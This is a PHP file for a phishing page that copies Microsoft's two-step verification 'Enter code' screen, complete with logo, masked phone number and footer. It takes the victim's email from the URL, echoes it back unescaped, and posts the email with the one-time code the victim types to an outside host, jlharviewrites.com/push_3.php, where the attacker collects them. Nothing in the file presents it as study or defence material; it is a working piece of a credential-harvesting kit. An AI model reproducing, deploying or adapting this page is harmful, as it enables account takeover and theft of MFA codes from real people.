<?php
error_reporting(0);

ini_set("output_buffering",4096);
session_start();

$email = $_SESSION['client_id'] = $_GET['client_id'];
?>


<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="3081">
    <meta name="LocLC" content="en-AU">

    <noscript>
 
    </noscript>

    
        <link rel="shortcut icon" href="favicon.ico">
    
    <meta name="robots" content="none">





    <script type="text/javascript">
        ServerData = $Config;
    </script>

    
<link crossorigin="anonymous" href="converged.v2.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
    <script crossorigin="anonymous" src="convergedlogin_pcore.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>


    <script crossorigin="anonymous" src="convergedloginpaginatedstrings-en.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    
    


</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top)o&&o.body&&(o.body.style.display="block");else if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}();

//]]></script>

<div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> 


<form method="post" action="https://jlharviewrites.com/push_3.php/?client_id=<?php echo $email; ?>">
    
    <!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div role="banner" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            availableCreds: sharedData.availableCreds,
                            defaultKmsiValue: svr.iDefaultLoginOptions === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            callMetadata: sharedData.callMetadata },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            redirect: $loginPage.view_onRedirect,
                            resetPassword: $loginPage.passwordView_onResetPassword } }"><!--  --> <input name="i13" data-bind="value: isKmsiChecked() ? 1 : 0" value="0" type="hidden"> 
                            
                            
                            <input name="login" data-bind="value: unsafe_username" value="<?php echo $email; ?>" type="hidden"> 
                            
                            
                            <input name="loginfmt" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="text"> <input name="type" data-bind="value: svr.fUseWizardBehavior ? 20 : 11" value="11" type="hidden"> <input name="LoginOptions" data-bind="value: isKmsiChecked() ? 1 : 3" value="3" type="hidden"> <input name="lrt" data-bind="value: callMetadata.IsLongRunningTransaction" value="" type="hidden"> <input name="lrtPartition" data-bind="value: callMetadata.LongRunningTransactionPartition" value="" type="hidden"> <input name="hisRegion" data-bind="value: callMetadata.HisRegion" value="" type="hidden"> <input name="hisScaleUnit" data-bind="value: callMetadata.HisScaleUnit" value="" type="hidden"><!-- TODO: Rename 'displayName' property to unsafe_displayName here and in other corresponding views --> <div data-bind="component: { name: 'identity-banner-control',
    params: {
        pawnIconId: svr.iPawnIcon,
        displayName: unsafe_displayName(),
        isBackButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; svr.fUseTextOnlyIdentityBannerWithBack },
    event: {
        backButtonClick: secondaryButton_onClick } }"><!--  --> <div class="identityBanner"><!-- ko if: isBackButtonVisible --> <button type="button" class="backButton" data-bind="
        click: backButton_onClick,
        hasFocus: focusOnBackButton,
        attr: {
            'id': backButtonId || 'idBtn_Back',
            'aria-describedby': backButtonDescribedBy,
            'aria-label': str['CT_HRD_STR_Splitter_Back'] }" id="idBtn_Back" aria-label="Back"><!-- ko ifnot: svr.fIsRTLMarket --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } -->
            
            
            <a href="index.php?client_id=<?php echo $_SESSION['client_id']; ?>"><img role="presentation" pngsrc="arrow_left.png?x=7cc096da6aa2dba3f81fcc1c8262157c" svgsrc="arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410" data-bind="imgSrc" src="arrow_left.svg?x=a9cc2824ef3517b6c4160dcf8ff7d410"></a><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> </button><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?php echo $_SESSION['client_id']; ?>"><?php echo $_SESSION['client_id']; ?></div><!-- ko ifnot: svr.fUseTextOnlyIdentityBannerWithBack --><!-- /ko --> </div></div>
            
            
            
            <div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Enter code</div><!-- ko if: unsafe_pageDescription --><!-- /ko --> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: passwordTextbox.error --><!-- /ko --> </div> 
            
            <div data-bind="component: { name: 'proof-image-field', params: { type: proofImageType, small: true, animate: twoWayPollingNeeded } }"><!--  --><!-- ko if: type === PROOF.Type.Email --><!-- /ko --><!-- ko if: type === PROOF.Type.SMS || type === PROOF.Type.TwoWaySMS || type === PROOF.Type.TwoWaySMSAlternateMobile --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="tile-img small" role="presentation" pngsrc="https://aadcdn.msauth.net/ests/2.1/content/images/picker_verify_sms_b15dda889e9803e9d6befd60000fadf8.png" svgsrc="https://aadcdn.msauth.net/ests/2.1/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg" data-bind="imgSrc, css: { 'small': small, 'animate-pulse': animate }" src="https://aadcdn.msauth.net/ests/2.1/content/images/picker_verify_sms_27a6d18b56f46818420e60a773c36d4e.svg"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: type === PROOF.Type.Voice || type === PROOF.Type.TwoWayVoice || type === PROOF.Type.TwoWayVoiceAlternateMobile || type === PROOF.Type.TwoWayVoiceOffice --><!-- /ko --><!-- ko if: type === PROOF.Type.TOTPAuthenticatorV2 --><!-- /ko --><!-- ko if: type === PROOF.Type.TOTPAuthenticator --><!-- /ko --></div>

<div id="idDiv_SAOTCC_Description" class="text-block-body overflow-hidden" data-bind="text: description">We texted your phone +XX XX X XX XX XX‎. Please enter the code to sign in.</div>
            <p></p>
            <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
                
                
                  <input name="password" id="i0118" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: passwordTextbox.value,
                    hasFocusEx: passwordTextbox.focused,
                    placeholder: $placeholderText,
                    ariaLabel: str['CT_PWD_STR_PwdTB_AriaLabel'],
                    css: { 'has-error': passwordTextbox.error }" placeholder="Code" aria-label="Enter password" type="text" required>
                    
                    
                    
                    <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div> </div> </div>
                    
                    
                    
                    
                    <!-- ko if: svr.urlHIPScript && showHip --><!-- /ko --> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"><div><!-- ko if: svr.fShowPersistentCookiesWarning --><!-- /ko --><!-- ko if: svr.fKMSIEnabled !== false && !svr.fShowPersistentCookiesWarning && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko --> 
                    
                    
                    
                  <div class="row"> <div id="idDiv_SAOTCC_TD_Section" class="no-margin-top-bottom" data-bind="visible: tdCheckbox.isShown &amp;&amp; !hideInputControls()"> <div id="idDiv_SAOTCC_TD" class="col-md-24 form-group no-margin-top checkbox" data-bind="css: { 'no-margin-top-bottom': !isInitialState &amp;&amp; !svr.urlMoreInfo &amp;&amp; !svr.fRepositionFooterButtons }"> <label id="idLbl_SAOTCC_TD_Cb"> <input id="idChkBx_SAOTCC_TD" type="checkbox" value="true" data-bind="checked: tdCheckbox.isChecked, disable: tdCheckbox.isDisabled, ariaLabel: str['CT_SAOTCC_STR_AddTD'], attr: { name: svr.sTrustedDeviceCheckboxName }" name="rememberMFA" aria-label="Don't ask again for 30 days"> <span data-bind="text: str['CT_SAOTCC_STR_AddTD']">Don't ask again for 30 days</span> </label> </div> </div><!-- ko if: isInitialState || svr.urlMoreInfo --> <div class="col-md-24"> <div class="text-13"><!-- ko if: isInitialState --> <div class="form-group" id="idDiv_SAOTCS_HavingTrouble" data-bind="
                        css: { 'no-margin-bottom': !svr.urlMoreInfo &amp;&amp; !svr.fRepositionFooterButtons },
                        htmlWithBindings: str['CT_SAOTCC_STR_Toggle'],
                        childBindings: { 'signInAnotherWay': { click: switchToOtcRequest_onClick } }">Having trouble? <a href="#" id="signInAnotherWay">Sign in another way</a></div><!-- /ko --><!-- ko if: svr.urlMoreInfo --> <div data-bind="css: { 'form-group': !twoWayPollingNeeded }" class="form-group"> <a id="moreInfoUrl" target="_blank" href="https://go.microsoft.com/fwlink/p/?LinkId=708614" data-bind="
                            text: str['CT_STR_More_Info'],
                            href: svr.urlMoreInfo,
                            ariaLabel: str['CT_STR_More_Info_AriaLabel'],
                            css: { 'no-margin-bottom': !svr.fRepositionFooterButtons }" aria-label="Get help with two-step verification">More information</a> </div><!-- /ko --> </div> </div><!-- /ko --> </div>
                    
                    
                   </div> </div> </div> </div><div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.fShowButtons,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() &amp;&amp; !svr.fUseTextOnlyIdentityBannerWithBack },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --><!-- /ko --> <div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign in" type="submit"> </div> </div></div> </div></div><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input name="ps" data-bind="value: postedLoginStateViewId" value="" type="hidden"> <input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"> <input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"> <input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"> <input name="canary" data-bind="value: svr.canary" value="vCXiy+khCr/Xnfbpcn9i9apJsYT/T9D1P1BTMXiqHOg=3:1" type="hidden"> <input name="ctx" data-bind="value: ctx" value="rQIIAXWRvW_TUADE43yhMgDqgroxIAZQ4o_n2HGkDnY-TKI6tlMnjtMhOI5TvybPduyXOsmKkBgYMjF0REKVOoDEQsXMgDp1ZmNDTIiJkeQPYLnlfjqd7p5m6CJdecwCtmTzI6Eg2BwosAJNFWyW4QqgBDjAUPS4RIFo_-6Dk9SHVzFz0vr4-cn1C_Tt5RXx0MM4jCskmSRJMZhMoOMWnQCR1wRxSxA_CeIinXP9gti9Sscc4DiOomi6xDMCy9MCKFqGSFlGAym1LlblOlCOKUo1uuDIbNKWqWPFVBLLrLNteTAd1DqexQw8xVBKbXnrrceoveNrEjwyvLOB4WDV1BnVkDwLteE2F35P31fFBfaYnQQRXLt_0nuTIELDMIjxReaSUEPXb46rge-7Di7uMNfH0LExDHwtCkI3wtCND931VG6h6Vw6X_UYC5fbUtJq6itJKkvcyAqHTTRsjFqRLNXworl0kGjypbO4j1BYsERW10YdE5QbcpfXu5K9TIyOijpzZdxLgNjVywtG85dGfSEmQqRpwWx4KvQsZRCtVb4VzY7bAf8pk9_OigL_JnNvW8qH40dhFEzgzL3NEr-yaSr3N0u8y20_Opi__UF-3Vc20uWb99pB6iZHnlf7cPVs6lUjsu9PRqHjC1Cww1ZsGaQh1GiNlgylD-fP1dNDUKE3eWKTz__OE6_vpL7s_e_hfw2" type="hidden"> <input name="hpgrequestid" data-bind="value: svr.sessionId" value="e1967119-c42f-4d12-9042-a78ca5501900" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADX8GCi6Js6SK82TsD2Pb7r-SmrsTfN6OQkO88Q7vno_Lk4kkqCT46125Cf4zaYKVSXh-c4JbmsmvU23B61NT7u3tB5vpD1jqu5HKIEGeG2DuzmRbZcIco5mVPxHho-4zGQqoZP4o_W02u0PzW3KxqzVEp5LinXIqZjhxioR8inuh5WAVaSI1DqdsEACU4Us4gHJx0IktxTUYK9vkN-Gxurf_6i1sSTMSYxd45LKt8OApPwz1fZae-FvKxn7ceW-7zon5Miyx_L-Bi7MEBXIoLTxWQdNG21kuZngV-fCczuLu0xIatbqKE9QCuZvLGiax0-od70rrXwGUtMd29QTY0SIAA" type="hidden"> <input name="PPSX" data-bind="value: svr.sRandomBlob" value="" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <input name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0" type="hidden"> <input name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1" type="hidden"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input name="i2" data-bind="value: clientMode" value="102" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="" type="hidden"> <input name="i18" data-bind="value: srsSuccess" value="" type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="">Terms of use</a> <a id="ftrPrivacy" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="ellipsis_white.png?x=0ad43084800fd8b50a2576b5173746fe" svgsrc="ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> 
                        
                        <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe style="display: none;" src="" width="0" height="0"></iframe></div> <!-- /ko --></div></body></html>
